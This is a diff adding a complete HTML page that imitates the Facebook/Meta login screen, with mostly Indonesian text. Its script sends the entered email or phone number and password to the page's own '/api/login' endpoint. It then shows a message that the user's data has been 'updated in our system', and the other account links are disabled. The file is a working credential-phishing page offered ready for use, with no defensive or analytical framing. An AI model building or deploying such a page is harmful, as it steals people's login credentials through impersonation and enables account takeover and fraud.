@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Facebook - Masuk</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 400px; width: 100%; }
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 20px 16px 28px;
+        }
+        .logo {
+            text-align: center;
+            font-size: 48px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        .meta {
+            text-align: center;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .input-group { margin-bottom: 12px; }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+        }
+        .login-btn {
+            background: #1877f2;
+            width: 100%;
+            padding: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 6px;
+        }
+        .login-btn:hover { background: #166fe5; }
+        .forgot { text-align: center; margin: 16px 0; }
+        .forgot a { color: #1877f2; text-decoration: none; font-size: 14px; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn {
+            background: #42b72a;
+            width: 100%;
+            padding: 12px;
+            font-size: 17px;
+            font-weight: bold;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 14px;
+            color: #606770;
+        }
+        .success-panel { text-align: center; padding: 20px; }
+        .success-icon { font-size: 56px; color: #42b72a; }
+        .success-panel h3 { font-size: 22px; margin: 12px 0; }
+        .success-panel p { color: #606770; margin-bottom: 28px; }
+        .back-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 17px;
+        }
+        .hidden { display: none; }
+        .error {
+            background: #ffe5e5;
+            color: #cc0000;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div id="loginPanel">
+            <div class="logo">facebook</div>
+            <div class="meta">Meta</div>
+            <div id="errorBox" class="error hidden"></div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="emailOrPhone" placeholder="Email address or mobile number" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="forgot"><a href="#">Forgotten password?</a></div>
+            <div class="divider"></div>
+            <button class="create-btn" id="createBtn">Create new account</button>
+            <div class="footer">✨ Explore the <strong>things</strong> Meta you love.</div>
+        </div>
+        <div id="successPanel" class="hidden">
+            <div class="success-panel">
+                <div class="success-icon">✓</div>
+                <h3>Terima kasih</h3>
+                <p>Data Anda sudah diperbaharui di dalam sistem kami.</p>
+                <button class="back-btn" id="backBtn">Kembali ke halaman awal</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const loginPanel = document.getElementById('loginPanel');
+    const successPanel = document.getElementById('successPanel');
+    const form = document.getElementById('loginForm');
+    const errorBox = document.getElementById('errorBox');
+    const backBtn = document.getElementById('backBtn');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
+        const password = document.getElementById('password').value;
+        if (!emailOrPhone || !password) {
+            errorBox.innerText = 'Harap isi email/phone dan password.';
+            errorBox.classList.remove('hidden');
+            return;
+        }
+        errorBox.classList.add('hidden');
+        try {
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ emailOrPhone, password })
+            });
+            const data = await res.json();
+            if (res.ok && data.success) {
+                loginPanel.classList.add('hidden');
+                successPanel.classList.remove('hidden');
+                document.getElementById('emailOrPhone').value = '';
+                document.getElementById('password').value = '';
+            } else {
+                errorBox.innerText = data.error || 'Gagal login.';
+                errorBox.classList.remove('hidden');
+            }
+        } catch (err) {
+            errorBox.innerText = 'Gagal konek ke server.';
+            errorBox.classList.remove('hidden');
+        }
+    });
+    backBtn.addEventListener('click', () => {
+        loginPanel.classList.remove('hidden');
+        successPanel.classList.add('hidden');
+    });
+    document.querySelector('.forgot a').addEventListener('click', (e) => e.preventDefault());
+    document.getElementById('createBtn').addEventListener('click', (e) => e.preventDefault());
+</script>
+</body>
+</html>
